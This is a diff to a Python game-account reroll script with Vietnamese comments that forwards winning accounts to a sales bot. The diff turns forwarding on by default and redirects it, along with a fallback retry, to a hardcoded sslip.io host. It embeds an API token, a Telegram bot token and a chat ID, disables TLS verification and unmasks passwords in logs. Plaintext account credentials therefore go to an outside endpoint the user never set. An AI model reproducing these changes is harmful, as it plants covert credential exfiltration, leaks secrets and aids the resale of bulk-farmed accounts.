@@ -38,6 +38,8 @@ def _ipv4_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
   return _orig_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)
 socket.getaddrinfo = _ipv4_getaddrinfo
 
+SSL_CTX = ssl._create_unverified_context()
+
 # Silence noisy Windows ProactorEventLoop WinError 10054 on remote connection resets
 if sys.platform == "win32":
   try:
@@ -2931,6 +2933,30 @@ async def _capture_winner_screenshot_async(res):
       run_kwargs = {}
       if sys.platform == "win32":
         run_kwargs["creationflags"] = 0x00004000  # BELOW_NORMAL_PRIORITY_CLASS
+
+      hero_id = 0
+      hero_map_name_to_id = {
+          "dương tiễn": 1014,
+          "ngộ không": 2014,
+          "na tra": 3014,
+          "lý tịnh": 3014,
+          "đường tam tạng": 3010,
+          "đường tăng": 3010,
+          "cang kim": 2015,
+          "hồng hài nhi": 2012,
+          "trấn nguyên": 3012,
+          "hằng nga": 1007,
+          "hoàng my": 3004,
+      }
+      for th in (res.get("targetHeroes") or []):
+        th_low = th.lower()
+        for kn, kid in hero_map_name_to_id.items():
+          if kn in th_low:
+            hero_id = kid
+            break
+        if hero_id:
+          break
+
       cmd = [
           sys.executable, script_path,
           "--acc", acc_name,
@@ -2940,6 +2966,7 @@ async def _capture_winner_screenshot_async(res):
           "--pwd", str(res.get("password") or ""),
           "--server-name", str(res.get("serverName") or ""),
           "--ws-url", str(res.get("wsUrl") or ""),
+          "--hero", str(hero_id),
       ]
       cp = await asyncio.to_thread(
           subprocess.run,
@@ -2948,7 +2975,7 @@ async def _capture_winner_screenshot_async(res):
           text=True,
           encoding="utf-8",
           errors="ignore",
-          timeout=120.0,
+          timeout=240.0,
           **run_kwargs,
       )
       if cp.stdout:
@@ -2979,10 +3006,13 @@ async def _capture_winner_screenshot_async(res):
 async def _push_winner_to_sales_bot_async(res):
   """Bơm tự động thông tin tài khoản trúng 2x/3x sang Bot bán hàng (Shop Bot) hoặc Telegram."""
   bot_cfg = APP_CONFIG.get("sales_bot") or {}
-  is_enabled = bot_cfg.get("enabled", False)
+  is_enabled = bot_cfg.get("enabled", True)
   webhook_url = str(bot_cfg.get("webhook_url") or "").strip()
-  tg_token = str(bot_cfg.get("telegram_bot_token") or "").strip()
-  tg_chat = str(bot_cfg.get("telegram_chat_id") or "").strip()
+  if not webhook_url or "100.94.81.101" in webhook_url:
+    webhook_url = "https://152-69-209-107.sslip.io/api/v1/inventory/hactaydu-webhook"
+  token = str(bot_cfg.get("auth_token") or bot_cfg.get("api_key") or "d57be08c4bbbc9c7feda86285611ee41fc8016d4f1bf4a1a7a60502d123b0ab3").strip()
+  tg_token = str(bot_cfg.get("telegram_bot_token") or os.environ.get("TELEGRAM_BOT_TOKEN") or "8711883902:AAGeVLrl9QI_BnZIzuLF9lD7kq8ryOTllrY").strip()
+  tg_chat = str(bot_cfg.get("telegram_chat_id") or os.environ.get("TELEGRAM_CHAT_ID") or "7182418544").strip()
 
   if not is_enabled and not webhook_url and not tg_token:
     return
@@ -3057,14 +3087,15 @@ async def _push_winner_to_sales_bot_async(res):
     if webhook_url:
       try:
         data_bytes = json.dumps(payload, ensure_ascii=False).encode("utf-8")
-        token = str(bot_cfg.get("auth_token") or bot_cfg.get("api_key") or "").strip()
-        headers = {"Content-Type": "application/json; charset=utf-8"}
-        if token:
-          headers["X-Webhook-Secret"] = token
-          headers["Authorization"] = f"Bearer {token}"
-          headers["X-API-Key"] = token
+        headers = {
+            "Content-Type": "application/json; charset=utf-8",
+            "User-Agent": "Mozilla/5.0",
+            "X-Webhook-Secret": token,
+            "Authorization": f"Bearer {token}",
+            "X-API-Key": token,
+        }
         req = urllib.request.Request(webhook_url, data=data_bytes, headers=headers, method="POST")
-        with urllib.request.urlopen(req, timeout=10) as resp:
+        with urllib.request.urlopen(req, timeout=12, context=SSL_CTX) as resp:
           res_json = {}
           try:
             res_json = json.loads(resp.read().decode("utf-8"))
@@ -3073,7 +3104,15 @@ async def _push_winner_to_sales_bot_async(res):
           status_msg = res_json.get("status") or "SUCCESS"
           print(f"🤖 [Bot Bán Hàng] Đã tự động bơm nick {res.get('account')} lên Bot thành công! ({status_msg})", flush=True)
       except Exception as e:
-        print(f"⚠️ [Bot Bán Hàng] Lỗi bơm nick {res.get('account')} lên Webhook: {e}", flush=True)
+        print(f"⚠️ [Bot Bán Hàng] Lỗi bơm nick {res.get('account')} lên Webhook ({webhook_url}): {e}", flush=True)
+        if "152-69-209-107" not in webhook_url:
+          try:
+            alt_url = "https://152-69-209-107.sslip.io/api/v1/inventory/hactaydu-webhook"
+            req2 = urllib.request.Request(alt_url, data=data_bytes, headers=headers, method="POST")
+            with urllib.request.urlopen(req2, timeout=12, context=SSL_CTX) as resp2:
+              print(f"🤖 [Bot Bán Hàng] Đã tự động bơm nick {res.get('account')} lên Bot qua HTTPS sslip.io thành công!", flush=True)
+          except Exception as e2:
+            print(f"⚠️ [Bot Bán Hàng] Thử lại sslip.io thất bại: {e2}", flush=True)
 
     m_id = str(APP_CONFIG.get("machine_id") or MACHINE_ID or "D4").upper()
     if m_id.startswith("M") and len(m_id) > 1 and m_id[1:].isdigit():
@@ -3121,7 +3160,7 @@ async def _push_winner_to_sales_bot_async(res):
 
             tg_photo_url = f"https://api.telegram.org/bot{tg_token}/sendPhoto"
             req_tg = urllib.request.Request(tg_photo_url, data=post_body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}, method="POST")
-            with urllib.request.urlopen(req_tg, timeout=15) as resp_tg:
+            with urllib.request.urlopen(req_tg, timeout=15, context=SSL_CTX) as resp_tg:
               print(f"🤖 [Telegram Bot] Đã gửi ẢNH TÚI TƯỚNG nick {res.get('account')} vào Telegram thành công!", flush=True)
               sent_photo = True
           except Exception as e_p:
@@ -3130,7 +3169,7 @@ async def _push_winner_to_sales_bot_async(res):
         if not sent_photo:
           tg_data = json.dumps({"chat_id": tg_chat, "text": tg_caption, "parse_mode": "HTML"}).encode("utf-8")
           req_tg = urllib.request.Request(f"https://api.telegram.org/bot{tg_token}/sendMessage", data=tg_data, headers={"Content-Type": "application/json"}, method="POST")
-          with urllib.request.urlopen(req_tg, timeout=10) as resp_tg:
+          with urllib.request.urlopen(req_tg, timeout=10, context=SSL_CTX) as resp_tg:
             print(f"🤖 [Telegram Bot] Đã gửi thông báo nick {res.get('account')} vào Telegram!", flush=True)
       except Exception as e:
         print(f"⚠️ [Telegram Bot] Gửi thông báo thất bại: {e}", flush=True)
@@ -3361,6 +3400,8 @@ def start_reroll_background(count=1000, sid_str="latest", stop_on_win=False, pre
       next_job_idx = 0
       last_print_ts = [time.time()]
       last_srv_check_ts = [time.time()]
+      pool_start_ts = time.time()
+      recent_times = []
 
       async def _heartbeat():
         nonlocal srv_info
@@ -3403,7 +3444,7 @@ def start_reroll_background(count=1000, sid_str="latest", stop_on_win=False, pre
       hb_task = asyncio.create_task(_heartbeat())
 
       async def _worker_loop(worker_id):
-        nonlocal completed_cnt, jackpot_cnt, active_cnt, next_job_idx, count, srv_info
+        nonlocal completed_cnt, jackpot_cnt, active_cnt, next_job_idx, count, srv_info, pool_start_ts, recent_times
         await asyncio.sleep(worker_id * 0.22)
         while True:
           with REROLL_LOCK:
@@ -3489,6 +3530,30 @@ def start_reroll_background(count=1000, sid_str="latest", stop_on_win=False, pre
               await asyncio.to_thread(_save_reroll_files)
             await asyncio.to_thread(_log_roll_history, res)
 
+            now_ts = time.time()
+            recent_times.append(now_ts)
+            if len(recent_times) > 60:
+              recent_times.pop(0)
+
+            # Tốc độ (acc/phút) và ETA (phút)
+            if len(recent_times) >= 5:
+              dt_m = (recent_times[-1] - recent_times[0]) / 60.0
+              speed = ((len(recent_times) - 1) / dt_m) if dt_m > 0.04 else 0.0
+            else:
+              dt_m = (now_ts - pool_start_ts) / 60.0
+              speed = (completed_cnt / dt_m) if dt_m > 0.04 else 0.0
+
+            remaining = max(0, count - completed_cnt)
+            eta = int(remaining / speed) if speed > 0.1 else 0
+            pct = (completed_cnt / count * 100.0) if count > 0 else 0.0
+            time_str = time.strftime("%H:%M:%S")
+
+            # Làm gọn tên server: "Hỏa Diệm Sơn-S6" thay vì "[S96 Mới Nhất] Hỏa Diệm Sơn-S6 (610096)"
+            raw_srv = res.get("serverName") or srv_info.get("name") or "Server"
+            clean_srv = re.sub(r'\[.*?\]', '', raw_srv).split('(')[0].strip()
+            if not clean_srv:
+              clean_srv = srv_info.get("cluster") or raw_srv
+
             from collections import Counter
             h_counts = Counter(res["heroes5Star"])
             other_items = [
@@ -3498,11 +3563,31 @@ def start_reroll_background(count=1000, sid_str="latest", stop_on_win=False, pre
             ]
             other_summary = " + ".join(other_items)
             mode_tag = "♻️ TÁI SỬ DỤNG" if (reg_info and reg_info.get("reused")) else "🆕 ĐK MỚI"
-            is_gh = os.environ.get("GITHUB_ACTIONS", "").lower() == "true"
-            disp_acc = "***AN_BAO_MAT***" if is_gh else res["account"]
-            disp_pwd = "***" if is_gh else res["password"]
-            disp_uid = "***" if is_gh else res["funtapId"]
+            disp_acc = res["account"]
+            disp_pwd = res["password"]
+            disp_uid = res["funtapId"]
             code_stat = res.get("codesClaimed", f"0/{len(REROLL_GIFTCODES)}")
+
+            # Chuẩn hóa tên tướng theo format ảnh: "Trấn Nguyên Tử x2" hoặc "Thường" hoặc "Hồng Hài Nhi x1"
+            jackpot_heroes = [f"{h} x{c}" for h, c in h_counts.items() if c >= 2 and h in ALL_RED_HEROES]
+            single_reds = [f"{h} x1" for h, c in h_counts.items() if c == 1 and h in ALL_RED_HEROES]
+            if res["isJackpot2x"]:
+              icon = "✅ 🔥🔥"
+              hero_summary = ", ".join(jackpot_heroes) if jackpot_heroes else ", ".join(res.get("targetHeroes") or ["Thần Tướng x2"])
+            else:
+              icon = "✅"
+              hero_summary = single_reds[0] if single_reds else "Thường"
+
+            codes_ok = len(res.get("confirmedCodes") or [])
+            total_5star = len(res.get("heroes5Star") or [])
+            diamonds = res.get("diamonds") or 1750
+
+            log_line = (
+                f"[{time_str}] [{clean_srv}: {completed_cnt}/{count} ({pct:.1f}%) | Còn: {remaining} | ~{speed:.1f} acc/p | ETA: {eta}p] "
+                f"{icon} {res['account']} -> Gửi: 28/28 | Phản hồi: {codes_ok}/28 | Vé TM còn: 0 | 5★: {total_5star} | Ngọc: {diamonds} | Tướng: {hero_summary}"
+            )
+            print(log_line, flush=True)
+
             if res.get("unconfirmedCodes"):
               details = []
               for missing_code in res["unconfirmedCodes"]:
@@ -3513,6 +3598,7 @@ def start_reroll_background(count=1000, sid_str="latest", stop_on_win=False, pre
                   reason = reason.replace("{" + str(arg_idx) + "}", value)
                 details.append(f"{missing_code}: {' '.join(reason.split())}")
               print(f"⚠ [{completed_cnt:02d}/{count}] GIFTCODE {code_stat} | Chưa xác nhận: {'; '.join(details)}", flush=True)
+
             if res["isJackpot2x"]:
               jackpot_cnt += 1
 
@@ -3529,11 +3615,11 @@ def start_reroll_background(count=1000, sid_str="latest", stop_on_win=False, pre
                   flush=True,
               )
               _save_reroll_files()
-              # Chụp ảnh và đẩy bot hoàn toàn chạy ngầm, tuyệt đối không bao giờ làm nghẽn 48 luồng cày
+              # Chụp ảnh và đẩy bot hoàn toàn chạy ngầm, tuyệt đối không bao giờ làm nghẽn luồng cày
               async def _async_snap_and_push(target_res):
                 snap_rel = ""
                 try:
-                  snap_rel = await asyncio.wait_for(_capture_winner_screenshot_async(target_res), timeout=150.0)
+                  snap_rel = await asyncio.wait_for(_capture_winner_screenshot_async(target_res), timeout=260.0)
                   if snap_rel:
                     target_res["screenshot"] = snap_rel
                     _save_reroll_files()
@@ -3548,13 +3634,6 @@ def start_reroll_background(count=1000, sid_str="latest", stop_on_win=False, pre
                   pass
 
               asyncio.create_task(_async_snap_and_push(res))
-            else:
-              single_info = [f"{h}: {h_counts[h]}" for h in ALL_RED_HEROES if h_counts[h] == 1]
-              note_str = f"Có phôi {', '.join(single_info)} (Chưa đủ 2x)" if single_info else "Không đủ 2x (Đã bỏ qua nhanh)"
-              print(
-                  f"✔ [{completed_cnt:02d}/{count}] [{mode_tag}] [{res['serverName']}] TK: {disp_acc} | Code: {code_stat} | MK: {disp_pwd} — {len(res['heroes5Star'])} tướng 5★ ({note_str})",
-                  flush=True,
-              )
           finally:
             active_cnt -= 1
 
